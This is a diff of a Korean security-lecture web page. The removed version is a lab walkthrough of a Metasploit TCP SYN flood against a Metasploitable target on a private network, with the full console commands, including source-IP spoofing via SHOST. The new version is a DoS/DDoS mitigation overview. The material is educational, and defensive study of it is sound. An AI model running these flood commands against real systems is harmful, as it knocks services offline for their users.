@@ -3,235 +3,218 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>메타스플로잇 프레임워크: TCP SYN Flooding 실습</title>
+    <title>Security & Cloud Hacking Lab</title>
     <script src="https://cdn.tailwindcss.com?plugins=typography"></script>
-    <script src="https://unpkg.com/lucide@latest"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+KR:wght@300;400;500;700;900&family=Fira+Code:wght@400;500&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+KR:wght@300;400;500;700;900&display=swap');
+        
+        /* 기본 글꼴 및 다크 모드 배경색 설정 */
         body { 
             font-family: 'Noto Sans KR', sans-serif; 
             background-color: #020617; 
             color: #f8fafc; 
-            margin: 0; padding: 0;
-            line-height: 1.8;
+            /* 전체 화면 배경 이미지 적용 및 투명도(Overlay) 설정: 텍스트 가시성을 위해 어두운 오버레이 강화 */
+            background-image: linear-gradient(to bottom, rgba(2, 6, 23, 0.75), rgba(2, 6, 23, 0.95)), 
+                              url('image_1a3201.jpg');
+            background-size: cover;
+            background-attachment: fixed;
+            background-position: center center;
         }
-        .terminal-bg { background-color: #020617; border: 1px solid #1e293b; }
-        .text-glow { text-shadow: 0 0 10px rgba(34, 211, 238, 0.4); }
-        .section-card { background: rgba(15, 23, 42, 0.6); border: 1px solid rgba(51, 65, 85, 0.5); backdrop-blur: xl; }
-        .code-block { font-family: 'Fira Code', monospace; }
+
+        /* 텍스트 리스트 호버 효과: 터미널 스타일 */
+        .list-hover {
+            transition: all 0.2s ease;
+        }
+        .list-hover:hover {
+            color: #22d3ee; 
+            padding-left: 0.75rem; 
+            background-color: rgba(15, 23, 42, 0.8); 
+            border-left-color: #0ea5e9;
+        }
+
+        /* 텍스트 가시성을 높이는 그림자 효과 클래스 */
+        .text-glow {
+            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.8);
+        }
+        .neon-glow {
+            text-shadow: 0 0 8px rgba(34, 211, 238, 0.6);
+        }
+        
+        /* 커스텀 스크롤바 (선택적 시각 강화) */
         ::-webkit-scrollbar { width: 8px; }
-        ::-webkit-scrollbar-track { background: transparent; }
+        ::-webkit-scrollbar-track { background: #0f172a; }
         ::-webkit-scrollbar-thumb { background: #334155; border-radius: 4px; }
         ::-webkit-scrollbar-thumb:hover { background: #0ea5e9; }
     </style>
+    <script>
+        tailwind.config = {
+            darkMode: 'class',
+        }
+    </script>
 </head>
-<body class="antialiased pb-20">
+<body class="min-h-screen flex flex-col">
+    <header class="py-24 px-6 relative overflow-hidden">
+        
+        <a href="https://putto4u.github.io/06.Hacking-Security" class="absolute top-6 left-6 md:left-10 z-20 group cursor-pointer block" target="_blank" rel="noopener noreferrer">
+            <div class="flex items-center space-x-2 bg-slate-900/80 py-2 px-4 rounded-xl border border-cyan-900/50 backdrop-blur-md shadow-[0_0_15px_rgba(8,145,178,0.2)] transition-all duration-300 group-hover:border-cyan-400/60 group-hover:shadow-[0_0_20px_rgba(34,211,238,0.4)]">
+                <div class="relative flex h-3 w-3 mr-1">
+                    <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-cyan-400 opacity-75"></span>
+                    <span class="relative inline-flex rounded-full h-3 w-3 bg-cyan-500"></span>
+                </div>
+                <span class="font-mono text-[10px] md:text-xs text-slate-400 tracking-wider">CHIEF SYSTEM ARCHITECT <span class="text-cyan-500 ml-1">❯</span></span>
+                <span class="font-black text-cyan-300 tracking-widest font-mono text-sm md:text-base neon-glow ml-1">PUTTO</span>
+                <span class="font-bold text-slate-200 tracking-widest font-mono text-sm md:text-base">'S LECTURES</span>
+            </div>
+        </a>
 
-    <!-- Header: 기술 사양 및 타이틀 -->
-    <header class="border-b border-slate-800 bg-slate-900/50 sticky top-0 z-50 backdrop-blur-md">
-        <div class="max-w-6xl mx-auto px-6 py-8 flex justify-between items-center">
-            <div>
-                <div class="flex items-center gap-2 mb-2">
-                    <span class="bg-cyan-500 text-slate-900 px-2 py-0.5 text-[10px] font-black uppercase tracking-widest rounded-sm shadow-[0_0_10px_rgba(34,211,238,0.5)]">Cyber Security Lab</span>
-                    <span class="text-slate-500 font-mono text-[10px]">MSF-LAB-04 | Offensive Security</span>
-                </div>
-                <h1 class="text-4xl font-black text-transparent bg-clip-text bg-gradient-to-r from-cyan-400 via-blue-500 to-indigo-500 tracking-tight leading-tight">
-                    메타스플로잇 서비스 거부 공격(DoS)<br><span class="text-slate-100 text-2xl">TCP SYN Flooding을 이용한 가용성 침해 실증</span>
-                </h1>
+        <div class="max-w-4xl mx-auto relative z-10 text-center mt-8">
+            <div class="inline-flex items-center justify-center space-x-3 mb-8 bg-slate-950/60 p-4 rounded-2xl backdrop-blur-md border border-slate-700/80 shadow-2xl">
+                <i class="fas fa-user-secret text-4xl text-cyan-400 drop-shadow-lg"></i>
+                <span class="text-slate-500">|</span>
+                <i class="fas fa-shield-halved text-4xl text-blue-500 drop-shadow-lg"></i>
             </div>
-            <div class="text-right hidden md:block border-l border-slate-800 pl-6">
-                <div class="bg-red-500/10 text-red-400 border border-red-500/20 px-4 py-2 rounded-xl text-sm font-black font-mono shadow-lg">
-                    SCORE: 9.5 (CRITICAL)
-                </div>
-                <p class="text-[10px] text-slate-500 mt-2 tracking-widest uppercase">System Architect Pro</p>
-            </div>
+            
+            <h1 class="text-4xl md:text-5xl lg:text-6xl font-black tracking-tight mb-2 pb-2 bg-clip-text text-transparent bg-gradient-to-r from-cyan-300 via-blue-400 to-indigo-400 drop-shadow-[0_5px_5px_rgba(0,0,0,0.8)]">
+                Cloud Security & Hacking Lab
+            </h1>
+            
+            <p class="mt-8 text-slate-100 font-medium text-lg md:text-xl max-w-2xl mx-auto leading-relaxed text-glow">
+                실전 클라우드 인프라 보안 및 모의 해킹 시나리오 연구 자료 저장소
+            </p>
         </div>
     </header>
 
-    <main class="max-w-6xl mx-auto px-6 py-16 space-y-24">
+    <main class="flex-grow max-w-4xl mx-auto px-6 py-8 w-full">
 
-        <!-- Section 1: 이론 및 아키텍처 도식 -->
-        <section>
-            <h2 class="text-2xl font-black border-l-4 border-cyan-500 pl-4 text-slate-100 mb-8 tracking-tight">
-                1. 아키텍처 개요 (Architecture Overview)
-            </h2>
-            <div class="section-card rounded-3xl p-10 shadow-2xl">
-                <p class="text-slate-300 text-lg mb-10 leading-relaxed">
-                    <strong>DoS (Denial of Service, 서비스 거부 공격)</strong>는 타겟 시스템의 네트워크 대역폭이나 CPU, 메모리 자원을 고갈시켜 정상적인 사용자가 서비스를 이용할 수 없게 만드는 공격입니다. 본 실습에서는 TCP (Transmission Control Protocol, 전송 제어 프로토콜)의 연결 설정 과정인 <strong>3-Way Handshake (3방향 연결 설정)</strong>의 구조적 결함을 악용하는 <strong>SYN Flooding (신 플러딩)</strong> 기법을 메타스플로잇의 보조 모듈(Auxiliary)을 통해 검증합니다.
-                </p>
-
-                <!-- 도식화 인포그래픽 영역 -->
-                <div class="bg-slate-900/80 border border-slate-800 rounded-2xl p-8 shadow-inner">
-                    <h4 class="text-center font-bold text-slate-400 mb-8 text-xs tracking-widest uppercase">
-                        [도식: TCP SYN Flooding 공격 아키텍처]
-                    </h4>
-                    <div class="flex flex-col md:flex-row items-center justify-between gap-4">
-                        <!-- Component A -->
-                        <div class="flex-1 text-center p-6 bg-slate-800 rounded-xl border border-cyan-900/50 shadow-lg relative">
-                            <div class="absolute -top-3 -left-3 bg-cyan-500 text-slate-900 text-xs font-black px-2 py-1 rounded">Attacker</div>
-                            <i data-lucide="terminal" class="w-12 h-12 text-cyan-400 mx-auto mb-4"></i>
-                            <div class="font-black text-slate-100 text-sm">해커 (Kali Linux)</div>
-                            <div class="text-xs text-slate-400 mt-2">위조된 IP(Spoofed IP)로<br>대량의 SYN 패킷 생성</div>
-                        </div>
-                        <!-- Arrow -->
-                        <div class="flex flex-col items-center px-4">
-                            <div class="text-xs text-red-400 font-bold mb-2 text-center">초당 수만 개의 SYN 요청<br>(ACK 응답 안 함)</div>
-                            <i data-lucide="arrow-right" class="w-8 h-8 text-red-500 rotate-90 md:rotate-0"></i>
-                        </div>
-                        <!-- Component B -->
-                        <div class="flex-1 text-center p-6 bg-slate-800 rounded-xl border border-red-900/50 shadow-lg relative">
-                            <div class="absolute -top-3 -right-3 bg-red-500 text-white text-xs font-black px-2 py-1 rounded">Victim</div>
-                            <i data-lucide="server" class="w-12 h-12 text-red-400 mx-auto mb-4"></i>
-                            <div class="font-black text-slate-100 text-sm">타겟 서버 (Metasploitable)</div>
-                            <div class="text-xs text-slate-400 mt-2">Backlog Queue (대기열) 가득 참<br><span class="text-red-400 font-bold">정상 서비스 중단 (Down)</span></div>
-                        </div>
-                    </div>
+                <div class="bg-slate-950/90 p-8 md:p-12 rounded-2xl shadow-2xl border border-slate-700/50 backdrop-blur-xl prose prose-invert prose-slate max-w-none prose-img:rounded-xl prose-a:text-cyan-400 hover:prose-a:text-cyan-300 prose-headings:text-slate-100 prose-strong:text-cyan-100">
+                    <h1>DoS DDoS 공격 및 방어 전략</h1>
+<p>인프라 가용성(Availability)을 위협하는 서비스 거부 공격은 2026년 현재 더욱 정교화된 AI 봇넷(Botnet)을 활용하여 전례 없는 규모로 발생하고 있습니다. 본 섹션에서는 고전적인 네트워크 계층 공격부터 최신의 애플리케이션 계층 공격까지, 그리고 이를 방어하기 위한 지능형 완화 전략을 다룹니다.</p>
+<hr />
+<h2>1. DoS (Denial of Service, 서비스 거부 공격) 및 DDoS (Distributed DoS) 이해</h2>
+<p>서비스 거부 공격의 핵심 목적은 시스템 자원(CPU, Memory, Network Bandwidth)을 고갈시켜 정당한 사용자의 접근을 차단하는 것입니다.</p>
+<h3>주요 공격 유형별 메커니즘</h3>
+<ul>
+<li><strong>볼륨 공격 (Volumetric Attacks):</strong> ICMP (Internet Control Message Protocol, 인터넷 제어 메시지 프로토콜) 플러딩이나 UDP (User Datagram Protocol) 증폭 공격을 통해 네트워크 대역폭을 점유합니다.</li>
+<li><strong>프로토콜 공격 (Protocol Attacks):</strong> TCP (Transmission Control Protocol, 전송 제어 프로토콜)의 3-Way Handshake 과정을 악용한 SYN Flood 공격 등으로 방화벽이나 로드 밸런서의 세션 테이블을 고갈시킵니다.</li>
+<li><strong>애플리케이션 공격 (Application Layer Attacks):</strong> HTTP (HyperText Transfer Protocol) GET/POST 플러딩과 같이 정상적인 요청으로 위장하여 서버의 연산 자원을 소모시키는 L7 공격입니다.</li>
+</ul>
+<blockquote>
+<p><strong>[공격 아키텍처 도식 설명]</strong>
+전 세계에 분산된 좀비 PC(C&amp;C 서버의 제어를 받는 봇)들이 중앙의 타겟 서버를 향해 동시다발적으로 공격 트래픽을 송출하며, 정상 사용자의 트래픽이 이 거대한 흐름 속에 묻히는 과정을 시각화합니다.</p>
+</blockquote>
+<hr />
+<h2>2. 지능형 DDoS 완화 전략 (Mitigation)</h2>
+<p>현대적인 방어 체계는 단순한 차단을 넘어, 트래픽을 정제하는 스크러빙(Scrubbing) 기술을 핵심으로 합니다.</p>
+<ul>
+<li><strong>AI 기반 행동 분석:</strong> AI가 평상시 트래픽 패턴을 학습하여, 공격 봇이 생성하는 미세한 비정상 패턴(예: 요청 간격의 일정함 등)을 즉시 포착하고 차단합니다.</li>
+<li><strong>엣지 단의 차단 (Edge Mitigation):</strong> 사용자에게 가장 가까운 CDN (Content Delivery Network, 콘텐츠 전송 네트워크) 거점에서 공격을 선제적으로 차단하여 오리진(Origin) 서버를 보호합니다.</li>
+<li><strong>애니캐스트 (Anycast) 라우팅:</strong> 단일 IP 주소로 유입되는 트래픽을 전 세계 여러 거점으로 분산 수용하여 공격 규모를 상쇄시킵니다.</li>
+</ul>
+<hr />
+<h2>3. 실전 방어 및 모니터링 기법</h2>
+<p>CERT 팀장의 관점에서 DDoS 방어의 핵심은 <strong>'가시성 확보'</strong>와 <strong>'자동화된 대응'</strong>입니다.</p>
+<ul>
+<li><strong>임계치 기반 차단 (Rate Limiting):</strong> IP당 요청 수나 연결 수를 제한하여 비정상적인 폭주를 억제합니다.</li>
+<li><strong>챌린지 (Challenge) 메커니즘:</strong> HTTP 302 리다이렉션이나 JavaScript 챌린지를 통해 브라우저를 사용하는 인간과 공격용 스크립트를 구분합니다.</li>
+</ul>
+<hr />
+<h3>[보안 아키텍트의 실전 팁]</h3>
+<p>DDoS 공격 시 가장 흔히 저지르는 실수는 모든 트래픽을 차단하려다 정상 서비스까지 마비시키는 것입니다. 반드시 <strong>BGP (Border Gateway Protocol, 경계 경로 프로토콜) Flowspec</strong> 등을 활용하여 공격 트래픽의 특성(Flow)만을 정밀하게 타격하여 차단해야 합니다.</p>
+<blockquote>
+<p><strong>[AWS 과금 주의 사항]</strong>
+- <strong>AWS Shield Standard:</strong> 모든 AWS 고객에게 무료로 제공되지만, L3/L4 수준의 기본적인 방어만 제공합니다.
+- <strong>AWS Shield Advanced:</strong> 월 $3,000의 비용이 발생하지만, DDoS 공격으로 인한 비용 전이(Scaling 비용)를 보상해주고 7계층 자동 완화 기능을 제공하므로 대규모 서비스에서는 필수적입니다.</p>
+</blockquote>
+<hr />
+<p><strong>Next Step: 시스템 취약점 공격 분석</strong></p>
                 </div>
-            </div>
-        </section>
-
-        <!-- Section 2: 실습 환경 -->
-        <section>
-            <h2 class="text-2xl font-black border-l-4 border-cyan-500 pl-4 text-slate-100 mb-8 tracking-tight">
-                2. 실습 구성 요소 (Components)
-            </h2>
-            <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
-                <div class="section-card rounded-3xl p-8 border-cyan-900/30 shadow-xl relative overflow-hidden">
-                    <div class="absolute top-0 right-0 bg-cyan-600 text-white text-[10px] font-black px-4 py-1 rounded-bl-xl uppercase tracking-tighter font-mono">NODE 01</div>
-                    <h3 class="text-xl font-bold text-slate-100 mb-6 flex items-center gap-3">
-                        <i data-lucide="crosshair" class="w-6 h-6 text-cyan-400"></i> 공격자 (Attacker)
-                    </h3>
-                    <ul class="space-y-4 text-sm text-slate-300">
-                        <li class="flex items-center gap-2"><i data-lucide="check" class="w-4 h-4 text-cyan-500"></i> <strong>운영체제:</strong> Kali Linux 2024.x</li>
-                        <li class="flex items-center gap-2"><i data-lucide="check" class="w-4 h-4 text-cyan-500"></i> <strong>프레임워크:</strong> Metasploit Framework (msfconsole)</li>
-                        <li class="flex items-center gap-2"><i data-lucide="check" class="w-4 h-4 text-cyan-500"></i> <strong>사용 모듈:</strong> auxiliary/dos/tcp/synflood</li>
-                        <li class="flex items-center gap-2"><i data-lucide="check" class="w-4 h-4 text-cyan-500"></i> <strong>IP 주소:</strong> 192.168.50.10 (사설 망)</li>
-                    </ul>
-                </div>
-                <div class="section-card rounded-3xl p-8 border-red-900/30 shadow-xl relative overflow-hidden">
-                    <div class="absolute top-0 right-0 bg-red-600 text-white text-[10px] font-black px-4 py-1 rounded-bl-xl uppercase tracking-tighter font-mono">NODE 02</div>
-                    <h3 class="text-xl font-bold text-slate-100 mb-6 flex items-center gap-3">
-                        <i data-lucide="target" class="w-6 h-6 text-red-400"></i> 희생자 (Victim Target)
-                    </h3>
-                    <ul class="space-y-4 text-sm text-slate-300">
-                        <li class="flex items-center gap-2"><i data-lucide="check" class="w-4 h-4 text-red-500"></i> <strong>운영체제:</strong> Metasploitable 2 (Ubuntu Linux)</li>
-                        <li class="flex items-center gap-2"><i data-lucide="check" class="w-4 h-4 text-red-500"></i> <strong>타겟 서비스:</strong> Apache Web Server (Port 80)</li>
-                        <li class="flex items-center gap-2"><i data-lucide="check" class="w-4 h-4 text-red-500"></i> <strong>상태:</strong> 방화벽(UFW) 및 안티-디도스 솔루션 미적용</li>
-                        <li class="flex items-center gap-2"><i data-lucide="check" class="w-4 h-4 text-red-500"></i> <strong>IP 주소:</strong> 192.168.50.100 (사설 망)</li>
-                    </ul>
-                </div>
-            </div>
-        </section>
-
-        <!-- Section 3: 명령어 및 절차 -->
-        <section>
-            <h2 class="text-2xl font-black border-l-4 border-cyan-500 pl-4 text-slate-100 mb-8 tracking-tight">
-                3. 실증 및 구현 (Implementation)
-            </h2>
-            <div class="section-card rounded-3xl p-10 shadow-2xl space-y-12">
                 
-                <!-- Step 01 -->
-                <div class="space-y-4">
-                    <div class="flex items-center gap-3">
-                        <span class="bg-cyan-500 text-slate-900 w-8 h-8 rounded-full flex items-center justify-center text-xs font-black italic">S.01</span>
-                        <h3 class="text-xl font-bold text-slate-100">DoS 모듈 검색 및 로드</h3>
-                    </div>
-                    <div class="pl-12">
-                        <p class="text-sm text-slate-400 mb-4">메타스플로잇 콘솔을 실행하고, TCP 프로토콜의 약점을 이용하는 SYN 플러딩 공격 모듈을 검색하여 장착합니다.</p>
-                        <div class="terminal-bg rounded-xl p-6 font-mono text-sm shadow-inner relative">
-                            <div class="absolute top-4 right-4 text-slate-600 text-[10px] uppercase font-black">Console</div>
-                            <div class="text-slate-200">msf6 > <span class="text-cyan-400">search synflood</span></div>
-                            <div class="text-slate-500 mt-2">Matching Modules</div>
-                            <div class="text-slate-500">================</div>
-                            <div class="text-slate-400 mt-2">#  Name                       Disclosure Date  Rank    Check  Description</div>
-                            <div class="text-slate-400">-  ----                       ---------------  ----    -----  -----------</div>
-                            <div class="text-slate-300">0  auxiliary/dos/tcp/synflood normal  No     TCP SYN Flooder</div>
-                            <div class="text-slate-200 mt-4">msf6 > <span class="text-cyan-400">use 0</span></div>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Step 02 -->
-                <div class="space-y-4 border-t border-slate-800 pt-8">
-                    <div class="flex items-center gap-3">
-                        <span class="bg-cyan-500 text-slate-900 w-8 h-8 rounded-full flex items-center justify-center text-xs font-black italic">S.02</span>
-                        <h3 class="text-xl font-bold text-slate-100">타겟 환경 및 위조 IP(Spoofing) 세팅</h3>
-                    </div>
-                    <div class="pl-12">
-                        <p class="text-sm text-slate-400 mb-4">공격 대상의 웹 서버 포트(80)를 지정합니다. 중요: <strong>SHOST (Spoofed Host, 위조된 출발지 IP)</strong>를 임의의 주소(예: 1.1.1.1)로 조작하여 타겟이 엉뚱한 곳으로 응답을 보내게 만들어 추적을 피하고 자원을 더 빨리 고갈시킵니다.</p>
-                        <div class="terminal-bg rounded-xl p-6 font-mono text-sm shadow-inner relative">
-                            <div class="absolute top-4 right-4 text-slate-600 text-[10px] uppercase font-black">Console</div>
-                            <div class="text-slate-200">msf6 auxiliary(dos/tcp/synflood) > <span class="text-cyan-400">set RHOSTS 192.168.50.100</span></div>
-                            <div class="text-slate-400">RHOSTS => 192.168.50.100</div>
-                            <div class="text-slate-200 mt-2">msf6 auxiliary(dos/tcp/synflood) > <span class="text-cyan-400">set RPORT 80</span></div>
-                            <div class="text-slate-400">RPORT => 80</div>
-                            <div class="text-slate-200 mt-2">msf6 auxiliary(dos/tcp/synflood) > <span class="text-cyan-400">set SHOST 1.1.1.1</span></div>
-                            <div class="text-slate-400">SHOST => 1.1.1.1</div>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Step 03 -->
-                <div class="space-y-4 border-t border-slate-800 pt-8">
-                    <div class="flex items-center gap-3">
-                        <span class="bg-red-500 text-slate-900 w-8 h-8 rounded-full flex items-center justify-center text-xs font-black italic">S.03</span>
-                        <h3 class="text-xl font-bold text-slate-100">플러딩 공격 개시 (Exploitation)</h3>
-                    </div>
-                    <div class="pl-12">
-                        <p class="text-sm text-slate-400 mb-4">설정이 완료되면 모듈을 실행합니다. 이 순간부터 칼리 리눅스는 초당 수만 개의 SYN 패킷을 타겟으로 쏟아부으며, 타겟 서버의 다른 터미널에서 <code>top</code> 명령어나 웹 브라우저 접속을 통해 시스템이 마비되는 것을 확인합니다.</p>
-                        <div class="terminal-bg rounded-xl p-6 font-mono text-sm shadow-inner relative">
-                            <div class="absolute top-4 right-4 text-slate-600 text-[10px] uppercase font-black">Console</div>
-                            <div class="text-slate-200">msf6 auxiliary(dos/tcp/synflood) > <span class="text-red-400">run</span></div>
-                            <div class="text-slate-400 mt-2">[*] SYN flooding 192.168.50.100:80...</div>
-                            <div class="text-red-400/80 italic mt-2">... (대량의 트래픽이 발생하며, 프롬프트가 대기 상태로 유지됨) ...</div>
-                            <div class="text-slate-500 mt-4">^C <span class="text-xs">// 공격 중단을 원할 경우 Ctrl+C 입력</span></div>
-                            <div class="text-slate-400">[*] Auxiliary module execution completed</div>
-                        </div>
-                    </div>
-                </div>
-
-            </div>
-        </section>
-
-        <!-- Section 4: 전문가 분석 -->
-        <section>
-            <h2 class="text-2xl font-black border-l-4 border-cyan-500 pl-4 text-slate-100 mb-8 tracking-tight">
-                4. 아키텍트 인사이트 (Expert Insight)
-            </h2>
-            <div class="bg-slate-900/40 border border-slate-800 rounded-3xl p-10 shadow-2xl space-y-10">
-                <div class="flex flex-col md:flex-row gap-8">
-                    <div class="flex-1 bg-slate-800/50 p-6 rounded-2xl border border-cyan-900/50 shadow-lg">
-                        <div class="text-cyan-400 mb-4"><i data-lucide="shield-check" class="w-8 h-8"></i></div>
-                        <h4 class="font-bold text-slate-100 mb-3">SYN Cookie 기반 방어 아키텍처</h4>
-                        <p class="text-sm text-slate-400 leading-relaxed">
-                            시스템 관리자는 이러한 공격을 방어하기 위해 운영체제 커널 수준에서 <strong>SYN Cookies(신 쿠키)</strong> 기능을 활성화(<code class="bg-slate-900 px-1 rounded text-cyan-300 text-xs">net.ipv4.tcp_syncookies = 1</code>)해야 합니다. 이를 통해 3-Way Handshake가 완전히 끝날 때까지 서버 메모리(Backlog Queue)를 할당하지 않아 자원 고갈을 원천적으로 차단할 수 있습니다.
-                        </p>
-                    </div>
-                    <div class="flex-1 bg-red-900/20 p-6 rounded-2xl border border-red-900/50 shadow-lg">
-                        <div class="text-red-400 mb-4"><i data-lucide="shield-alert" class="w-8 h-8"></i></div>
-                        <h4 class="font-bold text-red-300 mb-3">클라우드 AUP 위반 및 과금 주의</h4>
-                        <p class="text-sm text-slate-400 leading-relaxed">
-                            AWS(아마존 웹 서비스) EC2 환경에서 타겟을 향해 DoS 테스트를 수행할 경우, 초당 발생하는 막대한 <strong>아웃바운드(Outbound) 네트워크 트래픽으로 인해 폭탄 요금(추가 과금)</strong>이 청구될 수 있습니다. 더불어 AWS AUP(허용되는 사용 정책) 위반 시스템에 즉각 탐지되어 회사 전체의 계정이 영구 정지(Suspension)되므로 반드시 로컬 격리망에서만 테스트하십시오.
-                        </p>
-                    </div>
-                </div>
-            </div>
-        </section>
-
     </main>
-
-    <footer class="max-w-6xl mx-auto px-6 py-12 border-t border-slate-800 text-center">
-        <div class="text-slate-500 font-mono text-[10px] tracking-widest uppercase mb-4">
-            © 2026 IT Infrastructure Architecture Training. All rights reserved.
-        </div>
-        <p class="text-slate-600 text-[10px] leading-relaxed max-w-2xl mx-auto italic">
-            본 교재에 포함된 취약점 공격(Exploit) 및 서비스 거부 공격(DoS) 기법은 시스템 관리자와 아키텍트의 보안 통제 역량 강화를 위한 교육 및 방어 목적으로만 제공됩니다. 허가받지 않은 실제 시스템에 대한 테스트는 관련 법령에 의해 엄격히 처벌받습니다.
-        </p>
+    <footer class="border-t border-slate-800/80 py-8 text-center text-slate-400 text-sm bg-slate-950/90 backdrop-blur-md mt-auto">
+        <p class="font-mono">&copy; 2026 Putto's Lectures. All rights reserved. <span class="text-cyan-800 font-bold ml-2">| ACCESS SECURED.</span></p>
     </footer>
 
     <script>
-        lucide.createIcons();
+        // 전역 상태 변수: 디폴트를 'false'로 변경하여 모든 폴더가 처음에는 접혀있도록 설정합니다.
+        let isAllExpanded = false;
+
+        // 개별 폴더를 펼치거나 접는 함수
+        function toggleFolder(element) {
+            // 클릭된 헤더의 부모 섹션(Section) 및 내부 리스트 컨테이너(Container) 탐색
+            const section = element.closest('.folder-section');
+            const listContainer = section.querySelector('.list-container');
+            const folderIcon = element.querySelector('.folder-icon');
+            const chevronIcon = element.querySelector('.chevron-icon');
+            
+            // 데이터 속성(Data Attributes)에 저장된 아이콘 클래스명 불러오기
+            const baseIcon = element.getAttribute('data-base-icon');
+            const closedIcon = element.getAttribute('data-closed-icon');
+
+            // 현재 리스트가 펼쳐진 상태인지 확인 (CSS Grid 속성 기준)
+            const isExpanded = listContainer.classList.contains('grid-rows-[1fr]');
+
+            if (isExpanded) {
+                // 접기(Collapse) 액션 수행
+                listContainer.classList.remove('grid-rows-[1fr]', 'opacity-100');
+                listContainer.classList.add('grid-rows-[0fr]', 'opacity-0');
+                
+                // 우측 화살표 아이콘 회전
+                chevronIcon.classList.add('rotate-180');
+                
+                // 루트 디렉터리가 아닌 경우에만 폴더 아이콘 닫힘 상태로 변경
+                if (baseIcon !== 'fa-server') {
+                    folderIcon.classList.remove('fa-folder-open');
+                    folderIcon.classList.add('fa-folder');
+                }
+            } else {
+                // 펼치기(Expand) 액션 수행
+                listContainer.classList.remove('grid-rows-[0fr]', 'opacity-0');
+                listContainer.classList.add('grid-rows-[1fr]', 'opacity-100');
+                
+                // 우측 화살표 아이콘 원상 복구
+                chevronIcon.classList.remove('rotate-180');
+                
+                // 루트 디렉터리가 아닌 경우에만 폴더 아이콘 열림 상태로 변경
+                if (baseIcon !== 'fa-server') {
+                    folderIcon.classList.remove('fa-folder');
+                    folderIcon.classList.add('fa-folder-open');
+                }
+            }
+        }
+
+        // 전체 폴더를 일괄적으로 펼치거나 접는 함수
+        function toggleAllFolders() {
+            // 전역 상태 반전
+            isAllExpanded = !isAllExpanded;
+            
+            // DOM(Document Object Model, 문서 객체 모델)에서 모든 폴더 헤더 요소 선택
+            const headers = document.querySelectorAll('.folder-header');
+            const globalBtnIcon = document.getElementById('global-toggle-icon');
+            const globalBtnText = document.getElementById('global-toggle-text');
+
+            headers.forEach(header => {
+                const section = header.closest('.folder-section');
+                const listContainer = section.querySelector('.list-container');
+                const isCurrentlyExpanded = listContainer.classList.contains('grid-rows-[1fr]');
+
+                // 현재 개별 폴더의 상태가 전역 상태 목표와 다를 경우에만 토글 함수 실행
+                if (isAllExpanded !== isCurrentlyExpanded) {
+                    toggleFolder(header);
+                }
+            });
+
+            // 전역 토글 버튼의 UI(User Interface, 사용자 인터페이스) 업데이트
+            if (isAllExpanded) {
+                globalBtnIcon.classList.remove('fa-folder');
+                globalBtnIcon.classList.add('fa-folder-open');
+                globalBtnText.innerText = 'COLLAPSE ALL';
+            } else {
+                globalBtnIcon.classList.remove('fa-folder-open');
+                globalBtnIcon.classList.add('fa-folder');
+                globalBtnText.innerText = 'EXPAND ALL';
+            }
+        }
     </script>
 </body>
 </html>
